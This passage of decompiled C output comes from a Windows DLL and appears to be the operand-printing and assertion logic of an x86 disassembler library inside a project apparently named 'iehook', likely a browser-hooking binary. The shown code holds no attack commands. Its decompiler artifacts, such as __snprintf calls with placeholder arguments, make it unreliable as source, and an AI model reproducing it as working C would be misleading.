                int32_t v1309 = *(int32_t *)(v79 + 36); // 0x100087da
                if (v1309 >= 0 || v1309 >= 0 == (v1309 != 0)) {
                    goto lab_0x1000881e;
                } else {
                    // 0x100087e8
                    if ((*(int32_t *)v79 & 256) == 0) {
                        goto lab_0x1000881e;
                    } else {
                        if (v1282 == -1) {
                            // 0x1000880d
                            *v1279 = (int32_t)*v1278;
                            *v1281 = (int32_t)"%d";
                            v1274 = v1283;
                            v1275 = 0;
                            v1276 = v1280;
                        } else {
                            // 0x100087f4
                            *v1279 = (int32_t)*v1278;
                            *v1281 = (int32_t)"%d";
                            v1274 = v1283;
                            v1275 = 256 - v1283;
                            v1276 = v1280;
                        }
                        goto lab_0x100086cc;
                    }
                }
            }
            case 2: {
                unsigned char v1310 = *v18; // 0x100086e8
                int32_t v1311 = v1310; // 0x100086e8
                v1284 = (int16_t *)(v79 + 32);
                v1285 = (int32_t *)(v63 - 4);
                *v1285 = (int32_t)*v1284;
                v1286 = v63 - 8;
                v1287 = (int32_t *)v1286;
                *v1287 = (int32_t)"0x%02X=";
                *(int32_t *)(v63 - 12) = v1310 == -1 ? 0 : 256 - v1311;
                *(int32_t *)(v63 - 16) = v19 + v1311;
                int32_t v1312 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10008714
                v1288 = *v18 + (char)v1312;
                *v18 = v1288;
                v1289 = v1288;
                int32_t v1313 = *(int32_t *)(v79 + 36); // 0x10008728
                if (v1313 >= 0 || v1313 >= 0 == (v1313 != 0)) {
                    goto lab_0x1000876c;
                } else {
                    // 0x10008736
                    if ((*(int32_t *)v79 & 256) == 0) {
                        goto lab_0x1000876c;
                    } else {
                        if (v1288 == -1) {
                            // 0x1000875b
                            *v1285 = (int32_t)*v1284;
                            *v1287 = (int32_t)"%d";
                            v1274 = v1289;
                            v1275 = 0;
                            v1276 = v1286;
                        } else {
                            // 0x10008742
                            *v1285 = (int32_t)*v1284;
                            *v1287 = (int32_t)"%d";
                            v1274 = v1289;
                            v1275 = 256 - v1289;
                            v1276 = v1286;
                        }
                        goto lab_0x100086cc;
                    }
                }
            }
            case 4: {
                unsigned char v1314 = *v18; // 0x10008636
                int32_t v1315 = v1314; // 0x10008636
                v1290 = (int32_t *)(v79 + 32);
                v1291 = (int32_t *)(v63 - 4);
                *v1291 = *v1290;
                v1292 = v63 - 8;
                v1293 = (int32_t *)v1292;
                *v1293 = (int32_t)"0x%02lX=";
                *(int32_t *)(v63 - 12) = v1314 == -1 ? 0 : 256 - v1315;
                *(int32_t *)(v63 - 16) = v19 + v1315;
                int32_t v1316 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10008661
                v1294 = *v18 + (char)v1316;
                *v18 = v1294;
                v1295 = v1294;
                int32_t v1317 = *(int32_t *)(v79 + 36); // 0x10008675
                if (v1317 >= 0 || v1317 >= 0 == (v1317 != 0)) {
                    goto lab_0x100086b1;
                } else {
                    // 0x10008683
                    if ((*(int32_t *)v79 & 256) == 0) {
                        goto lab_0x100086b1;
                    } else {
                        if (v1294 == -1) {
                            // 0x100086a4
                            *v1291 = *v1290;
                            *v1293 = (int32_t)"%ld";
                            v1274 = v1295;
                            v1275 = 0;
                            v1276 = v1292;
                        } else {
                            // 0x1000868f
                            *v1291 = *v1290;
                            *v1293 = (int32_t)"%ld";
                            v1274 = v1295;
                            v1275 = 256 - v1295;
                            v1276 = v1292;
                        }
                        goto lab_0x100086cc;
                    }
                }
            }
            case 8: {
                unsigned char v1318 = *v18; // 0x1000856b
                int32_t v1319 = v1318; // 0x1000856b
                int32_t * v1320 = (int32_t *)(v79 + 36); // 0x10008584
                v1296 = (int32_t *)(v63 - 4);
                *v1296 = *v1320;
                v1297 = (int32_t *)(v79 + 32);
                v1298 = (int32_t *)(v63 - 8);
                *v1298 = *v1297;
                v1299 = (int32_t *)(v63 - 12);
                *v1299 = (int32_t)"0x%02I64X=";
                v1300 = (int32_t *)(v63 - 16);
                *v1300 = v1318 == -1 ? 0 : 256 - v1319;
                v1301 = (int32_t *)(v63 - 20);
                *v1301 = v19 + v1319;
                int32_t v1321 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000859a
                v1302 = *v18 + (char)v1321;
                *v18 = v1302;
                v1303 = *v1320;
                v1304 = v1302;
                if (v1303 >= 0 || v1303 >= 0 == (v1303 != 0)) {
                    goto lab_0x100085fe;
                } else {
                    // 0x100085be
                    if ((*(int32_t *)v79 & 256) == 0) {
                        goto lab_0x100085fe;
                    } else {
                        // 0x100085c6
                        *v1296 = v1303;
                        *v1298 = *v1297;
                        *v1299 = (int32_t)"%I64d";
                        *v1300 = v1302 == -1 ? 0 : 256 - v1304;
                        *v1301 = v19 + v1304;
                        int32_t v1322 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x100085eb
                        *v18 = *v18 + (char)v1322;
                        v1277 = v63;
                        goto lab_0x10008863;
                    }
                }
            }
            default: {
                // 0x1000884c
                *(int32_t *)(v63 - 4) = 3528;
                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *(int32_t *)(v63 - 12) = (int32_t)&g3;
                __wassert();
                v1277 = v63;
                goto lab_0x10008863;
            }
        }
    }
  lab_0x100091b7:;
    unsigned char v1323 = *v26; // 0x100091b7
    int32_t v1324; // 0x10003490
    if ((v1323 & -16) == 32) {
        uint16_t v1325 = *(int16_t *)v69;
        if ((*v823 & 256) == 0) {
            // 0x10009235
            v1324 = v1325;
        } else {
            // 0x1000922d
            v1324 = v1325;
        }
        goto lab_0x1000923b;
    } else {
        int32_t v1326 = (int32_t)(v1323 / 16) - 4; // 0x100091c6
        if (v1326 == 0) {
            int32_t v1327 = *(int32_t *)v69;
            v1324 = v1327;
            if ((*v823 & 256) == 0) {
                // 0x1000920e
                *v45 = v1327;
                *v46 = 0;
                goto lab_0x10009248;
            } else {
                goto lab_0x1000923b;
            }
        } else {
            if (v1326 != 4) {
                // 0x1000b22c
                *(int32_t *)(v63 - 4) = 3605;
                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *(int32_t *)(v63 - 12) = (int32_t)&g3;
                __wassert();
                return 0;
            }
            // 0x100091d4
            *v45 = *(int32_t *)v69;
            int32_t v1328 = *(int32_t *)(v69 + 4);
            int32_t v1329 = v1328; // 0x100091dd
            if ((*v823 & 256) == 0) {
                // 0x10009242
                *v46 = v1329;
                goto lab_0x10009248;
            } else {
                // 0x100091df
                *v46 = v1328;
                goto lab_0x10009248;
            }
        }
    }
  lab_0x1000a0e9:;
    int32_t v1330 = *v46; // 0x1000a0e9
    if (v1330 < 0) {
        // 0x1000a105
        *v1264 = *v1264 | 0x20000;
        goto lab_0x1000a10b;
    } else {
        if (v1330 != 0) {
            // 0x1000a0fd
            *v1264 = *v1264 | 0x40000;
            goto lab_0x1000a10b;
        } else {
            // 0x1000a0f4
            if (*v45 == 0) {
                // 0x1000a105
                *v1264 = *v1264 | 0x20000;
                goto lab_0x1000a10b;
            } else {
                // 0x1000a0fd
                *v1264 = *v1264 | 0x40000;
                goto lab_0x1000a10b;
            }
        }
    }
  lab_0x100084f0:
    // 0x100084f0
    *(int32_t *)(v79 + 32) = v810;
    v812 = v810 >> 31;
    goto lab_0x100084f4;
  lab_0x100084f4:
    // 0x100084f4
    *(int32_t *)(v79 + 36) = v812;
    v804 = v822;
    goto lab_0x100084f7;
  lab_0x10008b36:
    // 0x10008b36
    *v48 = *v48 + (int32_t)*v805;
    int32_t v1331 = v69 + (int32_t)*v805; // 0x10008b44
    v74 = v1331;
    v67 = v63;
    int32_t * v1332; // 0x10003490
    int32_t * v1333; // 0x10003490
    int32_t * v1334; // 0x10008b51
    if ((a3 & 4) == 0) {
        goto lab_0x1000af15;
    } else {
        // 0x10008b51
        v1334 = (int32_t *)v79;
        if ((int16_t)*v1334 > -1) {
            goto lab_0x10008b65;
        } else {
            // 0x10008b59
            if ((*v33 & 256) != 0) {
                // 0x10008b59
                v1333 = (int32_t *)(v63 - 8);
                v1332 = (int32_t *)(v63 - 4);
                goto lab_0x10008b7c;
            } else {
                goto lab_0x10008b65;
            }
        }
    }
  lab_0x1000a12d:;
    int32_t * v1335 = (int32_t *)(v1263 - 4);
    *v1335 = 4089;
    int32_t * v1336 = (int32_t *)(v1263 - 8);
    *v1336 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
    int32_t * v1337 = (int32_t *)(v1263 - 12);
    *v1337 = (int32_t)L"Index > 0 && Index < MAX_OPTYPE_INDEX && OptypeHandlers[Index]";
    __wassert();
    v1269 = v1337;
    v1268 = v1336;
    v1267 = v1335;
    goto lab_0x1000a144;
  lab_0x100084af:
    // 0x100084af
    *(int32_t *)(v79 + 32) = v825;
    *(int32_t *)(v79 + 36) = 0;
    v804 = v822;
    goto lab_0x100084f7;
  lab_0x1000923b:
    // 0x1000923b
    *v45 = v1324;
    // 0x10009242
    *v46 = v1324 >> 31;
    goto lab_0x10009248;
  lab_0x10008acc:
    // 0x10008acc
    *v45 = v811;
    v813 = v811 >> 31;
    goto lab_0x10008ad3;
  lab_0x10008ad3:
    // 0x10008ad3
    *v46 = v813;
    *(int32_t *)(v79 + 32) = *v45;
    *(int32_t *)(v79 + 36) = *v46;
    *v47 = *v47 | 1;
    v805 = v829;
    if ((*v828 & 3072) != 0) {
        int32_t v1537 = *v46 | *v45; // 0x10008b00
        v805 = v829;
        if (v1537 == 0) {
            if (v16 == v1537) {
                uint32_t v1538 = *v21; // 0x10008b0d
                uint32_t v1539 = *v23 + v1538; // 0x10008b14
                *(int32_t *)(v63 - 4) = *v24 + v1538 / 0x80000000 + (int32_t)(v1539 < v1538);
                *(int32_t *)(v63 - 8) = v1539;
                *(int32_t *)(v63 - 12) = (int32_t)"[0x%08I64X] ANOMALY: Both conditions of branch go to same address\n";
                _printf((char *)&g173);
            }
            // 0x10008b2f
            *v25 = *v25 | 16;
            v805 = v829;
        }
    }
    goto lab_0x10008b36;
  lab_0x1000a144:;
    int32_t * v1338 = v1267;
    int32_t * v1339 = v1268;
    *v1338 = v78;
    *v1339 = v79;
    v74 = v1262;
    v67 = v1263;
    int32_t v1340; // 0x10003490
    if ((a3 & 16) == 0) {
        goto lab_0x1000af15;
    } else {
        int32_t * v1341 = v1269;
        *(char *)(v19 + (int32_t)*v18) = 123;
        *v18 = *v18 + 1;
        int32_t v1342 = *v1264; // 0x1000a172
        int32_t v1343 = v1342; // 0x1000a178
        if ((v1342 & 0xe000) == 0) {
            // 0x1000a17a
            *v1338 = 4091;
            *v1339 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v1341 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
            __wassert();
            v1343 = *v1264;
        }
        int32_t v1344 = v1343; // 0x1000a197
        if ((v1343 & 0x200000) != 0) {
            // 0x1000a199
            *(char *)(v19 + (int32_t)*v18) = 114;
            *v18 = *v18 + 1;
            v1344 = *v1264;
        }
        int32_t v1345 = v1344; // 0x1000a1b1
        if ((v1344 & 0x100000) != 0) {
            // 0x1000a1b3
            *(char *)(v19 + (int32_t)*v18) = 102;
            *v18 = *v18 + 1;
            v1345 = *v1264;
        }
        int32_t v1346 = v1345; // 0x1000a1cb
        if ((v1345 & 1024) != 0) {
            // 0x1000a1cd
            *(char *)(v19 + (int32_t)*v18) = 99;
            *v18 = *v18 + 1;
            v1346 = *v1264;
        }
        int32_t v1347 = v1346; // 0x1000a1df
        if ((int16_t)v1347 > -1) {
            // 0x1000a1f6
            v1340 = v1347;
            if ((v1347 & 0x2000) == 0) {
                goto lab_0x1000a20f;
            } else {
                // 0x1000a1fd
                *(char *)(v19 + (int32_t)*v18) = 82;
                goto lab_0x1000a209;
            }
        } else {
            // 0x1000a1e8
            *(char *)(v19 + (int32_t)*v18) = 88;
            goto lab_0x1000a209;
        }
    }
  lab_0x10008863:;
    int32_t v1348 = v1277;
    v74 = v1273;
    v67 = v1348;
    if ((a3 & 16) == 0) {
        goto lab_0x1000af15;
    } else {
        // 0x1000886d
        *(char *)(v19 + (int32_t)*v18) = 123;
        *v18 = *v18 + 1;
        int32_t * v1349 = (int32_t *)v79; // 0x1000887f
        int32_t v1350 = *v1349; // 0x1000887f
        int32_t v1351 = v1350; // 0x10008885
        if ((v1350 & 0xe000) == 0) {
            // 0x10008887
            *(int32_t *)(v1348 - 4) = 3529;
            *(int32_t *)(v1348 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *(int32_t *)(v1348 - 12) = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
            __wassert();
            v1351 = *v1349;
        }
        int32_t v1352 = v1351; // 0x100088a4
        if ((v1351 & 0x200000) != 0) {
            // 0x100088a6
            *(char *)(v19 + (int32_t)*v18) = 114;
            *v18 = *v18 + 1;
            v1352 = *v1349;
        }
        int32_t v1353 = v1352; // 0x100088be
        if ((v1352 & 0x100000) != 0) {
            // 0x100088c0
            *(char *)(v19 + (int32_t)*v18) = 102;
            *v18 = *v18 + 1;
            v1353 = *v1349;
        }
        int32_t v1354 = v1353; // 0x100088d8
        if ((v1353 & 1024) != 0) {
            // 0x100088da
            *(char *)(v19 + (int32_t)*v18) = 99;
            *v18 = *v18 + 1;
            v1354 = *v1349;
        }
        // 0x100088ec
        v72 = v1273;
        v61 = v1354;
        v65 = v1348;
        if ((int16_t)v1354 > -1) {
            goto lab_0x1000ae34;
        } else {
            // 0x100088f9
            *(char *)(v19 + (int32_t)*v18) = 88;
            v73 = v1273;
            v66 = v1348;
            goto lab_0x1000ae47;
        }
    }
  lab_0x1000881e:
    if (v1282 == -1) {
        // 0x1000883b
        *v1279 = (int32_t)*v1278;
        *v1281 = (int32_t)"%u";
        v1274 = v1283;
        v1275 = 0;
        v1276 = v1280;
    } else {
        // 0x10008822
        *v1279 = (int32_t)*v1278;
        *v1281 = (int32_t)"%u";
        v1274 = v1283;
        v1275 = 256 - v1283;
        v1276 = v1280;
    }
    goto lab_0x100086cc;
  lab_0x1000876c:
    if (v1288 == -1) {
        // 0x10008789
        *v1285 = (int32_t)*v1284;
        *v1287 = (int32_t)"%u";
        v1274 = v1289;
        v1275 = 0;
        v1276 = v1286;
    } else {
        // 0x10008770
        *v1285 = (int32_t)*v1284;
        *v1287 = (int32_t)"%u";
        v1274 = v1289;
        v1275 = 256 - v1289;
        v1276 = v1286;
    }
    goto lab_0x100086cc;
  lab_0x100086b1:
    // 0x100086b1
    *v1291 = *v1290;
    *v1293 = (int32_t)"%lu";
    v1274 = v1295;
    v1275 = v1294 == -1 ? 0 : 256 - v1295;
    v1276 = v1292;
    goto lab_0x100086cc;
  lab_0x100085fe:
    // 0x100085fe
    *v1296 = v1303;
    *v1298 = *v1297;
    *v1299 = (int32_t)"%I64u";
    *v1300 = v1302 == -1 ? 0 : 256 - v1304;
    *v1301 = v19 + v1304;
    int32_t v1520 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10008623
    *v18 = *v18 + (char)v1520;
    v1277 = v63;
    goto lab_0x10008863;
  lab_0x10008161:
    // 0x10008161
    if ((*v826 & 0x4000) != 0) {
        // 0x10008169
        *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
        char v1521 = *v29; // 0x1000817d
        *v29 = v1521 + 16 & 48 | v1521 & -49;
        if (v75 >= 2) {
            // 0x1000819d
            *(int32_t *)(v63 - 4) = 3869;
            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *(int32_t *)(v63 - 12) = (int32_t)L"OperandIndex < 2";
            __wassert();
        }
        // 0x100081b7
        if (!((v42 != 4 | *v827 < 2))) {
            // 0x100081c7
            *v33 = *v33 | 2048;
        }
    }
    // 0x100081d1
    if ((*v826 & 0x2000) != 0) {
        // 0x100081d9
        *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
        *v29 = *v29 + 64;
    }
    // 0x10008202
    v74 = v69;
    v67 = v63;
    if ((a3 & 2) == 0) {
        goto lab_0x1000af15;
    } else {
        unsigned char v1522 = *v18; // 0x1000820c
        int32_t v1523 = v1522; // 0x1000820c
        int32_t v1524 = *(int32_t *)(v79 + 16); // 0x10008225
        int32_t * v1525 = (int32_t *)(v63 - 4); // 0x1000822f
        *v1525 = *(int32_t *)(4 * v1524 + (int32_t)&g68);
        int32_t * v1526 = (int32_t *)(v63 - 8); // 0x10008230
        *v1526 = v1522 == -1 ? 0 : 256 - v1523;
        int32_t * v1527 = (int32_t *)(v63 - 12); // 0x10008238
        *v1527 = v19 + v1523;
        int32_t v1528 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10008239
        unsigned char v1529 = *v18 + (char)v1528; // 0x1000823e
        *v18 = v1529;
        v74 = v69;
        v67 = v63;
        if ((a3 & 16) == 0) {
            goto lab_0x1000af15;
        } else {
            // 0x10008257
            *(char *)(v19 + (int32_t)v1529) = 123;
            *v18 = *v18 + 1;
            int32_t v1530 = *v826; // 0x10008265
            int32_t v1531 = v1530; // 0x1000826b
            if ((v1530 & 0xe000) == 0) {
                // 0x1000826d
                *v1525 = 3873;
                *v1526 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *v1527 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                __wassert();
                v1531 = *v826;
            }
            int32_t v1532 = v1531; // 0x1000828a
            if ((v1531 & 0x200000) != 0) {
                // 0x1000828c
                *(char *)(v19 + (int32_t)*v18) = 114;
                *v18 = *v18 + 1;
                v1532 = *v826;
            }
            int32_t v1533 = v1532; // 0x100082a4
            if ((v1532 & 0x100000) != 0) {
                // 0x100082a6
                *(char *)(v19 + (int32_t)*v18) = 102;
                *v18 = *v18 + 1;
                v1533 = *v826;
            }
            int32_t v1534 = v1533; // 0x100082be
            if ((v1533 & 1024) != 0) {
                // 0x100082c0
                *(char *)(v19 + (int32_t)*v18) = 99;
                *v18 = *v18 + 1;
                v1534 = *v826;
            }
            // 0x100082d2
            v72 = v69;
            v61 = v1534;
            v65 = v63;
            if ((int16_t)v1534 > -1) {
                goto lab_0x1000ae34;
            } else {
                // 0x100082df
                *(char *)(v19 + (int32_t)*v18) = 88;
                v73 = v69;
                v66 = v63;
                goto lab_0x1000ae47;
            }
        }
    }
  lab_0x10008152:
    // 0x10008152
    if (*(int32_t *)(*v27 + 4) == 3) {
        // 0x1000815b
        *(int32_t *)(v79 + 16) = v809 + 48;
    }
    goto lab_0x10008161;
  lab_0x10008b65:;
    int32_t * v1535 = (int32_t *)(v63 - 4);
    *v1535 = 3568;
    int32_t * v1536 = (int32_t *)(v63 - 8);
    *v1536 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
    *(int32_t *)(v63 - 12) = (int32_t)L"(Operand->Flags & OP_EXEC) && (Instruction->Groups & ITYPE_EXEC)";
    __wassert();
    v1333 = v1536;
    v1332 = v1535;
    goto lab_0x10008b7c;
  lab_0x100086cc:
    // 0x100086cc
    *(int32_t *)(v1276 - 4) = v1275;
    *(int32_t *)(v1276 - 8) = v1274 + v19;
    int32_t v1355 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x100086d5
    *v18 = *v18 + (char)v1355;
    v1277 = v1276 + 8;
    goto lab_0x10008863;
  lab_0x10007e22:
    // 0x10007e22
    *(int32_t *)(v832 - 4) = v830 == -1 ? 0 : 256 - v831;
    *(int32_t *)(v832 - 8) = v831 + v19;
    v808 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173);
    v819 = v832 + 8;
    goto lab_0x10007e33;
  lab_0x10009248:
    // 0x10009248
    *v48 = *v48 + (int32_t)(*v26 / 16);
    int32_t v1393 = v69 + (int32_t)(*v26 / 16); // 0x10009262
    v74 = v1393;
    v67 = v63;
    char v1388; // 0x10003490
    int32_t v1397; // 0x10003490
    int32_t v1387; // 0x10003490
    int32_t v1398; // 0x10003490
    int32_t v1396; // 0x10003490
    int32_t v1389; // 0x10003490
    int32_t v1390; // 0x10003490
    if ((a3 & 4) == 0) {
        goto lab_0x1000af15;
    } else {
        char v1399 = *v2; // 0x1000926f
        char v1400 = v1399 | 64; // 0x1000926f
        *v2 = v1400;
        int32_t v1401 = *v823; // 0x10009276
        int32_t v1402 = v1401; // 0x10009282
        if ((v1401 & 0x4000) != 0) {
            char v1403 = v1400; // 0x10009286
            if ((v1399 & 2) != 0) {
                // 0x10009288
                *(int32_t *)(v63 - 4) = 3613;
                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *(int32_t *)(v63 - 12) = (int32_t)L"!X86Instruction->HasDstAddressing";
                __wassert();
                v1403 = *v2;
            }
            // 0x1000929f
            *v2 = v1403 | 2;
            *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
            char v1404 = *v29; // 0x100092bd
            *v29 = v1404 & -52 | v75 & 3 | v1404 + 16 & 48;
            v1402 = *v823;
        }
        // 0x100092e3
        if ((v1402 & 0x2000) != 0) {
            // 0x100092eb
            if (*v34 != 0x4001) {
                // 0x100092f7
                if ((*v2 & 4) != 0) {
                    // 0x10009300
                    *(int32_t *)(v63 - 4) = 3613;
                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *(int32_t *)(v63 - 12) = (int32_t)L"!X86Instruction->HasSrcAddressing";
                    __wassert();
                }
            }
            // 0x10009317
            *v2 = *v2 | 4;
            *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
            char v1405 = *v29; // 0x1000932f
            *v29 = v1405 & 51 | 4 * v75 & 12 | v1405 + 64 & -64;
        }
        // 0x10009353
        if ((*v47 & 2) == 0) {
            int32_t v1406 = *v37; // 0x100093a1
            g161 = v1406;
            switch (v1406) {
                case 0: {
                }
                case 1: {
                }
                case 2: {
                }
                case 3: {
                    // 0x100093b3
                    *(int32_t *)(v79 + 8) = *v45;
                    *(int32_t *)(v79 + 12) = *v46;
                    // break -> 0x100093fe
                    break;
                }
                case 4: {
                }
                case 5: {
                    // 0x100093c7
                    *(int32_t *)(v63 - 4) = *v45;
                    *(int32_t *)(v63 - 8) = (int32_t)*v50;
                    int32_t v1407 = function_10001000((int32_t)&g173, (int32_t)&g173); // 0x100093d6
                    *(int32_t *)(v79 + 8) = v1407;
                    *(int32_t *)(v79 + 12) = v1407 >> 31;
                    // break -> 0x100093fe
                    break;
                }
                default: {
                    // 0x100093e7
                    *(int32_t *)(v63 - 4) = 3614;
                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *(int32_t *)(v63 - 12) = (int32_t)&g3;
                    __wassert();
                    // break -> 0x100093fe
                    break;
                }
            }
        } else {
            char v1408 = *v25; // 0x1000935c
            if ((v1408 & 16) == 0) {
                char v1409 = v1408; // 0x1000936d
                if (v16 == 0) {
                    // 0x1000936f
                    *(int32_t *)(v63 - 4) = *v37;
                    uint32_t v1410 = *v21; // 0x10009376
                    uint32_t v1411 = *v23 + v1410; // 0x1000937d
                    *(int32_t *)(v63 - 8) = *v24 + v1410 / 0x80000000 + (int32_t)(v1411 < v1410);
                    *(int32_t *)(v63 - 12) = v1411;
                    *(int32_t *)(v63 - 16) = (int32_t)"[0x%08I64X] ANOMALY: unexpected segment 0x%02X\n";
                    _printf((char *)&g173);
                    v1409 = *v25;
                }
                // 0x10009398
                *v25 = v1409 | 16;
            }
        }
        // 0x100093fe
        if (*v37 != 3) {
            // 0x10009407
            if ((*v28 & 8) == 0) {
                // 0x10009410
                *(int32_t *)(v63 - 4) = 3615;
                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *(int32_t *)(v63 - 12) = (int32_t)L"X86Instruction->Segment == SEG_DS || X86Instruction->HasSegmentOverridePrefix";
                __wassert();
            }
        }
        // 0x10009427
        v74 = v1393;
        v67 = v63;
        if ((a3 & 2) == 0) {
            goto lab_0x1000af15;
        } else {
            int16_t * v1412 = (int16_t *)(v79 + 6); // 0x10009431
            if (*v1412 >= 9) {
                // 0x10009438
                *(int32_t *)(v63 - 4) = 3619;
                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *(int32_t *)(v63 - 12) = (int32_t)L"(Operand)->Length <= 8";
                __wassert();
            }
            int32_t v1413 = *v823;
            int32_t v1414; // 0x10003490
            int32_t v1415; // 0x10003490
            int32_t v1416; // 0x10003490
            if ((*v47 & 2) == 0) {
                int32_t * v1417 = (int32_t *)(v63 - 4);
                if ((v1413 & 0x100000) != 0) {
                    // 0x100094b4
                    *v1417 = 3619;
                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *(int32_t *)(v63 - 12) = (int32_t)L"!((Operand)->Flags & OP_FAR)";
                    __wassert();
                }
                int32_t v1418 = *v37; // 0x100094cb
                int32_t * v1419; // 0x10003490
                int32_t v1420; // 0x10003490
                int32_t * v1421; // 0x10003490
                int32_t v1422; // 0x10003490
                if (v1418 < 6) {
                    int32_t v1423 = v63 - 12; // 0x10009520
                    v1421 = (int32_t *)v1423;
                    v1420 = v1423;
                    v1419 = (int32_t *)(v63 - 8);
                    v1422 = v1418;
                } else {
                    // 0x100094d4
                    *v1417 = 3619;
                    int32_t * v1424 = (int32_t *)(v63 - 8);
                    *v1424 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    int32_t v1425 = v63 - 12;
                    int32_t * v1426 = (int32_t *)v1425;
                    *v1426 = (int32_t)L"X86Instruction->Segment < SEG_MAX";
                    __wassert();
                    v1421 = v1426;
                    v1420 = v1425;
                    v1419 = v1424;
                    v1422 = *v37;
                }
                unsigned char v1427 = *v18; // 0x100094eb
                int32_t v1428 = v1427; // 0x100094eb
                *v1417 = *(int32_t *)(4 * v1422 + (int32_t)&g46);
                uint16_t v1429 = *v1412; // 0x10009512
                int32_t v1430 = *(int32_t *)(4 * (int32_t)(v1429 / 2) + (int32_t)&g47); // 0x10009518
                *v1419 = v1430;
                *v1421 = (int32_t)"%s %s:[";
                v1414 = v1427 == -1 ? 0 : 256 - v1428;
                v1415 = v1428;
                v1416 = v1420;
            } else {
                int32_t * v1431 = (int32_t *)(v63 - 4);
                int32_t * v1432; // 0x10003490
                int32_t v1433; // 0x10003490
                int32_t * v1434; // 0x10003490
                if ((v1413 & 0x100000) != 0) {
                    int32_t v1435 = v63 - 12; // 0x100094a5
                    v1434 = (int32_t *)v1435;
                    v1433 = v1435;
                    v1432 = (int32_t *)(v63 - 8);
                } else {
                    // 0x10009460
                    *v1431 = 3619;
                    int32_t * v1436 = (int32_t *)(v63 - 8);
                    *v1436 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    int32_t v1437 = v63 - 12;
                    int32_t * v1438 = (int32_t *)v1437;
                    *v1438 = (int32_t)L"(Operand)->Flags & OP_FAR";
                    __wassert();
                    v1434 = v1438;
                    v1433 = v1437;
                    v1432 = v1436;
                }
                unsigned char v1439 = *v18; // 0x10009477
                int32_t v1440 = v1439; // 0x10009477
                *v1431 = *v37;
                uint16_t v1441 = *v1412; // 0x10009497
                int32_t v1442 = *(int32_t *)(4 * (int32_t)(v1441 / 2) + (int32_t)&g47); // 0x1000949d
                *v1432 = v1442;
                *v1434 = (int32_t)"%s 0x%02X:[";
                v1414 = v1439 == -1 ? 0 : 256 - v1440;
                v1415 = v1440;
                v1416 = v1433;
            }
            int32_t v1443 = v1416;
            int32_t * v1444 = (int32_t *)(v1443 - 4); // 0x10009525
            *v1444 = v1414;
            int32_t * v1445 = (int32_t *)(v1443 - 8); // 0x1000952d
            *v1445 = v1415 + v19;
            int32_t v1446 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000952e
            unsigned char v1447 = *v18 + (char)v1446; // 0x10009533
            *v18 = v1447;
            unsigned char v1448 = *v26; // 0x10009539
            if ((v1448 & -16) == 32) {
                int32_t v1449 = v1447; // 0x100095e7
                *(int32_t *)(v1443 + 8) = (int32_t)*v49;
                int32_t v1450 = v1443 + 4; // 0x10009608
                *(int32_t *)v1450 = (int32_t)"0x%04X";
                v1397 = v1447 == -1 ? 0 : 256 - v1449;
                v1398 = v1449;
                v1396 = v1450;
                goto lab_0x1000960d;
            } else {
                int32_t v1451 = v1443 + 12; // 0x10009543
                switch ((int32_t)(v1448 / 16)) {
                    case 4: {
                        int32_t v1452 = v1447; // 0x100095b4
                        if (v1447 == -1) {
                            // 0x100095d7
                            *(int32_t *)(v1443 + 8) = *v45;
                            int32_t v1453 = v1443 + 4; // 0x100095e0
                            *(int32_t *)v1453 = (int32_t)"0x%04lX";
                            v1397 = 0;
                            v1398 = v1452;
                            v1396 = v1453;
                        } else {
                            // 0x100095bf
                            *(int32_t *)(v1443 + 8) = *v45;
                            int32_t v1454 = v1443 + 4; // 0x100095d0
                            *(int32_t *)v1454 = (int32_t)"0x%04lX";
                            v1397 = 256 - v1452;
                            v1398 = v1452;
                            v1396 = v1454;
                        }
                        goto lab_0x1000960d;
                    }
                    case 8: {
                        int32_t v1455 = v1447; // 0x10009575
                        *(int32_t *)(v1443 + 8) = *v46;
                        *(int32_t *)(v1443 + 4) = *v45;
                        *(int32_t *)v1443 = (int32_t)"0x%04I64X";
                        *v1444 = v1447 == -1 ? 0 : 256 - v1455;
                        *v1445 = v19 + v1455;
